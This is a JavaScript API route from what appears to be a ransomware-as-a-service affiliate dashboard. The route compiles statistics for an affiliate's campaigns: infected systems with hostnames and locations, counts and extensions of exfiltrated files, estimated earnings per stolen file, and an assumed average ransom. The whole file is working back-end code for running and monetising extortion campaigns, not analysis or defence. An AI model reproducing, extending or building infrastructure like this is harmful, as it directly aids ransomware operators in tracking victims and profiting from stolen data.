// vercel-dashboard/api/affiliate/stats/overview.js
// Affiliate overview statistics

import { kv } from '../../../lib/kv.js';
import { verifyPayloadApiKey } from '../../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'GET') return response.status(405).json({ error: 'Method not allowed' });

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'campaign') {
    return response.status(403).json({ error: 'Affiliate access required' });
  }

  const affiliateId = `aff_${auth.campaignId.replace('camp_', '')}`;
  const { range = '7d' } = request.query;

  try {
    const days = range === '1d' ? 1 : range === '7d' ? 7 : range === '30d' ? 30 : range === '90d' ? 90 : 7;
    const dates = [];
    for (let i = days - 1; i >= 0; i--) {
      const d = new Date();
      d.setDate(d.getDate() - i);
      dates.push(d.toISOString().split('T')[0]);
    }

    // Get affiliate's campaigns
    const campaignIds = await kv.smembers(`affiliate:${affiliateId}:campaigns`) || [];
    
    let totalInfections = 0;
    let activeInfections = 0;
    let totalFiles = 0;
    let totalBytes = 0;
    const daily = [];
    const topExtensions = {};
    const recentActivity = [];
    const topCountries = {};

    for (const cid of campaignIds) {
      // Campaign stats
      const stats = await kv.hgetall(`campaign:${cid}:stats`) || {};
      totalInfections += parseInt(stats.totalInfections || '0');
      totalFiles += parseInt(stats.totalFiles || '0');
      totalBytes += parseInt(stats.totalBytes || '0');

      // Daily stats
      for (const date of dates) {
        const dayStats = await kv.hgetall(`campaign:${cid}:daily:${date}`) || {};
        const existing = daily.find(d => d.date === date);
        const uploads = parseInt(dayStats.uploads || '0');
        const bytes = parseInt(dayStats.bytes || '0');
        const infections = parseInt(dayStats.infections || '0');
        
        if (existing) {
          existing.infections += infections;
          existing.files += uploads;
          existing.bytes += bytes;
          existing.earnings += 0; // Would come from payment tracking
        } else {
          daily.push({ date, infections, files: uploads, bytes, earnings: 0 });
        }
      }

      // Extensions
      const exts = await kv.hgetall(`campaign:${cid}:exts`) || {};
      for (const [ext, count] of Object.entries(exts)) {
        topExtensions[ext] = (topExtensions[ext] || 0) + parseInt(count);
      }

      // Recent systems (for activity feed)
      const systems = await kv.smembers(`campaign:${cid}:systems`) || [];
      for (const sid of systems.slice(0, 5)) {
        const sys = await kv.get(`system:${sid}`);
        if (sys) {
          const s = await kv.hgetall(`system:${sid}:stats`) || {};
          recentActivity.push({
            id: sys.id,
            type: 'infection',
            message: `New infection: ${sys.hostname} (${sys.country})`,
            timestamp: sys.firstSeen,
            metadata: { campaignId: cid, campaignName: (await kv.get(`campaign:${cid}`))?.name }
          });
        }
      }

      // Countries
      for (const sid of systems) {
        const sys = await kv.get(`system:${sid}`);
        if (sys) {
          const key = `${sys.country}/${sys.city}`;
          topCountries[key] = (topCountries[key] || 0) + 1;
        }
      }
    }

    // Calculate active infections
    for (const cid of campaignIds) {
      const systems = await kv.smembers(`campaign:${cid}:systems`) || [];
      for (const sid of systems) {
        const sys = await kv.get(`system:${sid}`);
        if (sys && sys.status === 'active') activeInfections++;
      }
    }

    // Sort activity
    recentActivity.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    // Top extensions array
    const topExtensionsArray = Object.entries(topExtensions)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 15)
      .map(([ext, count]) => ({ ext, count }));

    // Top countries array
    const topCountriesArray = Object.entries(topCountries)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 10)
      .map(([key, infections]) => {
        const [country, city] = key.split('/');
        return { country, city, infections, earnings: 0 };
      });

    // Mock earnings (would come from payment tracking)
    const totalEarnings = totalFiles * 0.5; // $0.50 per file exfiltrated estimate
    const pendingEarnings = totalEarnings * 0.3;
    const conversionRate = totalInfections > 0 ? (activeInfections / totalInfections * 100).toFixed(1) : 0;
    const avgRansom = 5000;

    return response.json({
      summary: {
        totalInfections,
        activeInfections,
        totalFiles,
        totalBytes,
        totalEarnings,
        pendingEarnings,
        conversionRate: parseFloat(conversionRate),
        avgRansom,
      },
      daily,
      topExtensions: topExtensionsArray,
      topCountries: topCountriesArray,
      recentActivity: recentActivity.slice(0, 20),
    });
  } catch (error) {
    console.error('Affiliate overview stats error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}